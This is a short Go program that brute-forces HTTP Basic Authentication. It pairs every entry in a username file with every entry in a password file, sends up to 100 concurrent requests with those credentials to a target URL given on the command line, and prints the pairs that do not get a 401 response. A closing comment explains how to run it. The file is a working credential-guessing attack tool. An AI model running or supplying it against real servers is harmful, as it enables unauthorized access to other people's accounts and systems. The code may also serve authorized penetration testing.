package main

import (
	"bufio"
	"encoding/base64"
	"fmt"
	"net/http"
	"os"
	"strings"
)

func create_auth_list(uFile, pFile string) []string {
	readLines := func(path string) []string {
		f, _ := os.Open(path)
		defer f.Close()
		var out []string
		s := bufio.NewScanner(f)
		for s.Scan() {
			line := strings.TrimSpace(s.Text())
			if line != "" {
				out = append(out, line)
			}
		}
		return out
	}

	users := readLines(uFile)
	passes := readLines(pFile)

	var basic_auth []string

	for _, u := range users {
		for _, p := range passes {
			// auth := base64.StdEncoding.EncodeToString([]byte(u + ":" + p))
			basic_auth = append(basic_auth, base64.StdEncoding.EncodeToString([]byte(u+":"+p)))
		}
	}
	//fmt.Println(basic_auth)
	return basic_auth

}

func main() {

	//domain_path := "https://example.com"

	domain_path := os.Args[1]

	userFile := os.Args[2]
	passFile := os.Args[3]

	var auth_list = create_auth_list(userFile, passFile)

	// fmt.Println(auth_list)

	client := &http.Client{}

	maxConcurrency := 50
	limiter := make(chan struct{}, maxConcurrency)
	maxRequests := 100
	sent := 0

	for _, auth := range auth_list {
		if sent >= maxRequests {
			break
		}
		limiter <- struct{}{}
		go func(a string) {
			defer func() { <-limiter }()

			req, _ := http.NewRequest("GET", domain_path, nil)
			// req, _ := http.NewRequest("GET", "https://webhook.site/4bc57d4b-dd9c-4ed2-8add-bac2100892b3", nil)

			req.Header.Set("Authorization", "Basic "+a)
			req.Header.Set("User-Agent", "MyGoRequester/1.0")

			resp, _ := client.Do(req)

			if resp != nil {
				defer resp.Body.Close()
			}

			if resp != nil && resp.StatusCode != 401 {
				fmt.Println(a)
			}
		}(auth)
		sent++
		if sent%100 == 0 {
			fmt.Printf("Sent %d requests...\n", sent)
		}
	}

	for i := 0; i < cap(limiter); i++ {
		limiter <- struct{}{}
	}
}

//
// RUN WITH -> go run PATH-TO-SCRIPT URL USERNAME-LIST-PATH PASSWORD-LIST-PATH
//
